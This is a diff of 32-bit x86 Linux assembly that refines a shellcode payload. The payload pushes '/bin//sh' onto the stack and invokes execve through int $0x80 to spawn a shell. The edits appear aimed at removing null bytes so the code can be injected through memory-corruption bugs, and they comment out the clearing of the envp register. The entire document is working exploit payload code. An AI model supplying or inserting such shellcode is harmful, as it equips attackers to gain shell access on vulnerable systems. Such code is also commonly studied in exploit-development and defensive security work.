@@ -11,24 +11,27 @@
 
     .global _start
 _start:
-    xorl %eax, %eax
-    # \0xff 'h' 's' '/'
-    pushl $0xff68732f
+    xorl %ecx, %ecx
+
+    # '\x00'
+    pushl %ecx
+    # 'h' 's' '/' '/'
+    pushl $0x68732f2f
     # 'n' 'i' 'b' '/'
     pushl $0x6e69622f
 
-    movb %al, 7(%esp)
-
     # __NR_execve 11
-    movb $11, %al
+    # movb $11, %al
+    pushl $11
+    popl %eax
 
     # const char *filename
     movl %esp, %ebx
 
     # char *const argv[]
-    xorl %ecx, %ecx
+    # xorl %ecx, %ecx
 
     # char *const envp[]
-    xorl %edx, %edx
+    # xorl %edx, %edx
 
     int $0x80
